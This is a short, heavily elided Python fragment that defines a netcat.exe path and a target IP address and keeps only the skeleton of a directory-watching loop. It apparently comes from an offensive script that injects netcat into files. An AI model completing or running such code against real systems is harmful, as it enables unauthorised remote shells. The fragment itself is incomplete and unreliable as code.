...
NETCAT = "c:\\users\\sunjob.ODIN\\scripts\\netcat.exe"
TGT_IP = "192.168.1.121"
        ...
        try:
            ...
            for action, file_name in results:
                ...
                if action == FILE_CREATED:
                    ...
                    print(f"[?] Unknown action occurred on {full_filename}")
        except Exception:
            pass
